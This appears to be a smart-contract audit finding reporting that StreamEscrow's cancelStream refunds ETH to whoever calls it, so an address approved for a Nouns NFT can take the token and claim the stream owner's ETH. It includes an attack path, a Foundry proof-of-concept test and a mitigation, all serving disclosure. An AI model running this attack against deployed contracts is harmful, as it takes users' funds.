# any nft approved by the user can cancel Stream and steal user eth

### Summary

any one who had approved by the user can cancel Stream and steal user eth .

### Root Cause

the `cancelStream` allow the user to cancel the stream , however it did not refund the user his eth , but the one who call the funtion . 

```solidity
    function cancelStream(uint256 nounId) public {
        ...snip...
        // transfer noun to treasury
        nounsToken.transferFrom(msg.sender, nounsRecipient, nounId);
        ...snip...
        (bool sent, ) = msg.sender.call{ value: amountToRefund }('');
        require(sent, 'failed to send eth');
    }
```
a nft approved by the user can send the nft to his self and call `cancelStream` since the function not refund the eth to one who own the stream or the creator he can get the eth . an approved can only transfer nft but `StreamEscrow` contract allow then to steal user eth who had stream.

### Internal pre-conditions

1.attacker need an approve for the nft.
2.user create stream.

### External pre-conditions

1.user want to cancel the stream.
2.attacker fornt-run `cancelStream`.
3.attacker send nft to him self.
4.attacker call `cancelStream` and get user eth.

### Attack Path

_No response_

### Impact

loss of user fund.

### PoC

```solidity
function test_cancelStream() public {
        vm.prank(streamCreator);
        escrow.forwardAllAndCreateStream{ value: 1 ether }({ nounId: 1, streamLengthInTicks: 100 });
        vm.prank(streamCreator);
        nounsToken.transferFrom(streamCreator, user, 1);
        address attacker = makeAddr("Attacker");
        vm.prank(user);
        nounsToken.approve(address(escrow), 1);
        vm.prank(user);
        //@audit we need an approve
        nounsToken.approve(attacker, 1);
        vm.prank(attacker);
        //@audit we transfer token to us
        nounsToken.transferFrom(user, attacker, 1);
        vm.startPrank(attacker);
        nounsToken.approve(address(escrow), 1);
        escrow.cancelStream(1);
    }
```

### Mitigation

only refund the eth to the owner of stream.
